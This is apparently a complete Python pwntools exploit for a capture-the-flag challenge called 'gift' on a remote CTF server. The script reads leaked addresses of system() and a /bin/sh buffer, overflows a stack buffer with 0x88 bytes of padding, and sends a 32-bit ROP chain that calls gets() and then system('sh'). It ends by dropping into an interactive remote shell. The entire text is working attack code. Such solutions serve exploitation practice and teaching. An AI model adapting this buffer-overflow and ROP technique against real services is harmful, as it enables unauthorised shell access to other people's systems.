#!/usr/bin/python3

from pwn import *

p = remote("ctf.j0n9hyun.xyz", 3018)
e = ELF("./gift")
#context.log_level = 'debug'

p.recvuntil(": ")
binsh = int(p.recvuntil(" ").decode('utf-8').strip(" "), 16)
system = int(p.recvuntil("\n").decode('utf-8').strip("\n"), 16)
padding = b"A"*0x88

p1r = 0x80483ad
gets = e.symbols['gets']

chain = p32(gets)
chain += p32(p1r)
chain += p32(binsh)
chain += p32(system)
chain += b"FFFF"
chain += p32(binsh)

payload = padding
payload += chain

p.sendline("Hellooo")
p.sendlineafter("\n", payload)
p.sendline("sh")

log.info("/bin/sh: " + hex(binsh))
log.info("system: " + hex(system))
p.interactive()
